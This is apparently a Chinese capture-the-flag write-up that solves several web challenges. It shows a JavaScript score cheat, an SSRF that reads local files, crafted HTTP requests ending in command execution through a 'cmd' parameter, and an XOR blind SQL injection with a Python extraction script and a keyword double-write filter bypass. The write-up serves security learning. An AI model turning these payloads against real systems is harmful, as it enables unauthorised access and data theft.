+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;23acb23b-4ff2-4123-a8cd-9010827f2ee9&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h1><h3 id="考察点：前端代码漏洞"><a href="#考察点：前端代码漏洞" class="headerlink" title="考察点：前端代码漏洞"></a>考察点：<font color="red">前端代码漏洞</font></h3><p>确实很<code>ez</code></p>
+<p><img src="/../images/image-20250520144300265-1747723382047-21.png" alt="image-20250520144300265"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">game.<span class="property">score</span> = <span class="number">100000000000</span>;</span><br><span class="line">game.<span class="title function_">successCallback</span>(game.<span class="property">score</span>);</span><br><span class="line">/每次输完记得回车一下</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="ezSSRF"><a href="#ezSSRF" class="headerlink" title="ezSSRF"></a>ezSSRF</h1><h3 id="考察点：SSRF读取任意文件"><a href="#考察点：SSRF读取任意文件" class="headerlink" title="考察点：SSRF读取任意文件"></a>考察点：<font color="red">SSRF读取任意文件</font></h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Try to add ?url=xxxx.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$x</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;(;_;)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>] === <span class="literal">null</span> &amp;&amp; <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;Well, Going to &#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;(^-＿-^)&quot;</span>; </span><br></pre></td></tr></table></figure>
+
+<p>关键：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>] === <span class="literal">null</span> &amp;&amp; <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span>) &#123;  <span class="comment">// 关键条件：URL无host且协议是http</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;Well, Going to &#x27;</span> . <span class="variable">$url</span>);  <span class="comment">// 提示即将请求该URL</span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);  <span class="comment">// 初始化cURL会话</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);  <span class="comment">// 不获取响应头</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);  <span class="comment">// 让cURL返回响应内容而非直接输出</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  <span class="comment">// 执行请求，获取响应内容</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  <span class="comment">// 关闭cURL会话</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$result</span>);  <span class="comment">// 输出响应内容</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;(^-＿-^)&quot;</span>;  <span class="comment">// 不满足条件时输出表情</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-尝试输入百度："><a href="#1-尝试输入百度：" class="headerlink" title="1.尝试输入百度："></a>1.尝试输入百度：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://27.25.151.26:14553/?url=http:/www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520153253947-1747726374614-23.png" alt="image-20250520153253947"></p>
+<p><strong>出现百度页面，说明存在<code>SSRF</code></strong></p>
+<p><strong>尝试读取文件</strong></p>
+<p><img src="/../images/image-20250520163116390-1747729877244-27.png" alt="image-20250520163116390"></p>
+<p>失败了，路径穿越也不行</p>
+<p><strong>经过一顿查询：</strong></p>
+<p><img src="/../images/image-20250520162954052-1747729795163-25.png" alt="image-20250520162954052"></p>
+<p><strong>发现直接输入就能读取文件啦</strong></p>
+<h3 id="直接读取："><a href="#直接读取：" class="headerlink" title="直接读取："></a>直接读取：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://27.25.151.26:46857/?url=http:/127.0.0.1/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520165940815-1747731581829-29.png" alt="image-20250520165940815"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//27.25.151.26:46857/?url=http:/127.0.0.1/FFFFF11111AAAAAggggg.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520170012521-1747731613231-31.png" alt="image-20250520170012521"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f49a99c8-0e31-4908-80f3-4102841a4383&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="签到："><a href="#签到：" class="headerlink" title="签到："></a>签到：</h1><h3 id="考察点：网络传输"><a href="#考察点：网络传输" class="headerlink" title="考察点：网络传输"></a>考察点：<font color="red">网络传输</font></h3><h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><p><img src="/../images/image-20250520213737660-1747748258624-33.png" alt="image-20250520213737660"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=welcome HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">27.25</span><span class="number">.151</span><span class="number">.26</span>:<span class="number">29416</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">138.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">138.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">5</span></span><br><span class="line">Origin: http://<span class="number">27.25</span><span class="number">.151</span><span class="number">.26</span>:<span class="number">29416</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://<span class="number">27.25</span><span class="number">.151</span><span class="number">.26</span>:<span class="number">29416</span>/</span><br><span class="line">Cookie: star=admin</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line"></span><br><span class="line">b=new</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二关：-l23evel4-php"><a href="#第二关：-l23evel4-php" class="headerlink" title="第二关：&#x2F;l23evel4.php"></a>第二关：&#x2F;l23evel4.php</h3><p><img src="/../images/image-20250520222825370-1747751306080-35.png" alt="image-20250520222825370"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://27.25.151.26:45124/l23evel4.php?password=2025a</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三关：-levelThree-php"><a href="#第三关：-levelThree-php" class="headerlink" title="第三关：&#x2F;levelThree.php"></a>第三关：&#x2F;levelThree.php</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /levelThree.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">27.25</span><span class="number">.151</span><span class="number">.26</span>:<span class="number">45124</span></span><br><span class="line">Referer: http://dummy.com/secretcode</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">138.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">138.0</span></span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">11</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">key=ctfpass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520223830714-1747751911500-37.png" alt="image-20250520223830714"></p>
+<h3 id="第四关：-level444Four-php"><a href="#第四关：-level444Four-php" class="headerlink" title="第四关：&#x2F;level444Four.php"></a>第四关：&#x2F;level444Four.php</h3><p><strong>奶奶的，搞了半天，原来一直没有修改<code>GET</code>为<code>HEAD</code></strong></p>
+<p><img src="/../images/image-20250520230452106-1747753493023-39.png" alt="image-20250520230452106"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HEAD /level444Four.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">27.25</span><span class="number">.151</span><span class="number">.26</span>:<span class="number">45124</span></span><br><span class="line">User-Agent: identity=n1c3</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: star=user</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br></pre></td></tr></table></figure>
+
+<p>得到：FLAG: <code>./level4545Five.php</code></p>
+<h3 id="第五关：-level4545Five-php"><a href="#第五关：-level4545Five-php" class="headerlink" title="第五关：&#x2F;level4545Five.php"></a>第五关：&#x2F;level4545Five.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> order = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">var</span> code = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; order.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        code += a[order[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Your hidden key is:&quot;</span>, code);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;     </span><br></pre></td></tr></table></figure>
+
+<p>根据提供的 JavaScript 源码，<strong>隐藏的 key</strong> 是通过重组数组元素生成的。以下是关键步骤解析：</p>
+<hr>
+<h3 id="步骤拆解"><a href="#步骤拆解" class="headerlink" title="步骤拆解"></a><strong>步骤拆解</strong></h3><ol>
+<li><p><strong>数组定义</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> order = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>];</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>重组逻辑</strong>：<br>按 <code>order</code> 数组的索引顺序，依次从 <code>a</code> 中取元素拼接：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code += a[order[i]];  <span class="comment">// order[i] 是 a 的索引</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>逐项解析</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">order[<span class="number">0</span>] = <span class="number">2</span> → a[<span class="number">2</span>] = <span class="string">&#x27;W&#x27;</span></span><br><span class="line">order[<span class="number">1</span>] = <span class="number">5</span> → a[<span class="number">5</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">order[<span class="number">2</span>] = <span class="number">1</span> → a[<span class="number">1</span>] = <span class="string">&#x27;l&#x27;</span></span><br><span class="line">order[<span class="number">3</span>] = <span class="number">8</span> → a[<span class="number">8</span>] = <span class="string">&#x27;C&#x27;</span></span><br><span class="line">order[<span class="number">4</span>] = <span class="number">7</span> → a[<span class="number">7</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">order[<span class="number">5</span>] = <span class="number">0</span> → a[<span class="number">0</span>] = <span class="string">&#x27;E&#x27;</span></span><br><span class="line">order[<span class="number">6</span>] = <span class="number">3</span> → a[<span class="number">3</span>] = <span class="string">&#x27;_&#x27;</span></span><br><span class="line">order[<span class="number">7</span>] = <span class="number">9</span> → a[<span class="number">9</span>] = <span class="string">&#x27;C&#x27;</span></span><br><span class="line">order[<span class="number">8</span>] = <span class="number">6</span> → a[<span class="number">6</span>] = <span class="string">&#x27;t&#x27;</span></span><br><span class="line">order[<span class="number">9</span>] = <span class="number">4</span> → a[<span class="number">4</span>] = <span class="string">&#x27;F&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>拼接结果</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">W + <span class="number">3</span> + l + C + <span class="number">0</span> + E + _ + C + t + F → <span class="string">&quot;W3lC0E_CtF&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>得到：</p>
+<p><img src="/../images/image-20250520231125860-1747753886742-41.png" alt="image-20250520231125860"></p>
+<h3 id="第六关：-zzpufinish-php"><a href="#第六关：-zzpufinish-php" class="headerlink" title="第六关：&#x2F;zzpufinish.php"></a>第六关：&#x2F;zzpufinish.php</h3><p><img src="/../images/image-20250520231247448-1747753968110-43.png" alt="image-20250520231247448"></p>
+<p><strong>先<code>ls</code>康康</strong>（我还正准备试试看之前学的绕过，结果什么防火墙都没有。。。。。）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">27.25</span><span class="number">.151</span><span class="number">.26</span>:<span class="number">45124</span>/zzpufinish.php?cmd=ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520231314276-1747753994964-45.png" alt="image-20250520231314276"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">27.25</span><span class="number">.151</span><span class="number">.26</span>:<span class="number">45124</span>/zzpufinish.php?cmd=nl fl /*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520231432868-1747754073518-47.png" alt="image-20250520231432868"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2fe2e016-5b65-4239-a8e0-a09f91957087&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="zqsql"><a href="#zqsql" class="headerlink" title="zqsql"></a>zqsql</h1><h3 id="考察点：sql隐藏不显示过滤"><a href="#考察点：sql隐藏不显示过滤" class="headerlink" title="考察点：sql隐藏不显示过滤"></a>考察点：<font color="red">sql隐藏不显示过滤</font></h3><p>我怀疑是异或注入：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>^(length(database())&gt;<span class="number">0</span>)^<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<p><img src="/../images/image-20250521000746072-1747757267160-49.png" alt="image-20250521000746072"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>^(length(database())&lt;<span class="number">0</span>)^<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250521000815359-1747757296088-51.png" alt="image-20250521000815359"></p>
+<p><strong>返回不一样</strong></p>
+<h3 id="2-手工测试长度："><a href="#2-手工测试长度：" class="headerlink" title="2.手工测试长度："></a>2.手工测试长度：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>^(length(database())&gt;<span class="number">2</span>)^<span class="number">1</span>				有回显；</span><br><span class="line"><span class="number">1</span>^(length(database())&gt;<span class="number">3</span>)^<span class="number">1</span>				无</span><br><span class="line">长度为<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>^(<span class="built_in">ascii</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">99</span>)^<span class="number">1</span>  	成功返回</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-叫AI写个脚本"><a href="#3-叫AI写个脚本" class="headerlink" title="3.叫AI写个脚本"></a>3.叫<code>AI</code>写个脚本</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://27.25.151.26:29331/?&quot;</span></span><br><span class="line">temp = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">db_length = <span class="number">3</span>  <span class="comment"># 已知数据库名长度为3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_length + <span class="number">1</span>):</span><br><span class="line">    low, high = <span class="number">0</span>, <span class="number">128</span>  <span class="comment"># 扩大范围以覆盖所有ASCII字符</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        <span class="comment"># 构造Payload（直接爆破database()）</span></span><br><span class="line">        payload = <span class="string">f&quot;1^(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)^1&quot;</span></span><br><span class="line">        temp[<span class="string">&quot;id&quot;</span>] = payload</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 发送请求并检查响应</span></span><br><span class="line">        r = requests.get(url, params=temp)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Position <span class="subst">&#123;i&#125;</span>: low=<span class="subst">&#123;low&#125;</span>, high=<span class="subst">&#123;high&#125;</span>, mid=<span class="subst">&#123;mid&#125;</span>, payload=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 关键修改：根据admin是否存在调整区间</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># 条件为真（字符ASCII &gt; mid），调整low</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 条件为假（字符ASCII &lt;= mid），调整high</span></span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环结束后，mid即为字符ASCII码</span></span><br><span class="line">    db_name += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Current Database Name: <span class="subst">&#123;db_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Final Database Name: <span class="subst">&#123;db_name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250521002517947-1747758318715-53.png" alt="image-20250521002517947"></p>
+<p><strong>返回库为：<code>ctf</code></strong></p>
+<h3 id="4-疑点："><a href="#4-疑点：" class="headerlink" title="4.疑点："></a>4.疑点：</h3><p>为什么：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">^</span>(ascii(substr((<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>ctf)),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">0</span>)<span class="operator">^</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">#会返回失败呢？？</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-继续测试："><a href="#5-继续测试：" class="headerlink" title="5.继续测试："></a>5.继续测试：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>database())<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span>#</span><br><span class="line">返回，验证ctf是对的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-我稍微查询我的笔记："><a href="#6-我稍微查询我的笔记：" class="headerlink" title="6.我稍微查询我的笔记："></a>6.我稍微查询我的笔记：</h3><h4 id="您猜怎么着，还真给我查出来了"><a href="#您猜怎么着，还真给我查出来了" class="headerlink" title="您猜怎么着，还真给我查出来了"></a>您猜怎么着，还真给我查出来了</h4><p><img src="/../images/image-20250521144116081-1747809676770-1.png" alt="image-20250521144116081"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">3</span>#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250521144306565-1747809787441-3.png" alt="image-20250521144306565"></p>
+<h2 id="答案：-1"><a href="#答案：-1" class="headerlink" title="答案："></a>答案：</h2><h3 id="SELECT被过滤。。。隐藏不显示过滤"><a href="#SELECT被过滤。。。隐藏不显示过滤" class="headerlink" title="SELECT被过滤。。。隐藏不显示过滤"></a>SELECT被过滤。。。<font color="red">隐藏不显示过滤</font></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span>selselectect<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250524214211649-1748094132431-3.png" alt="image-20250524214211649"></p>
+<p><strong>测试双写成功返回</strong></p>
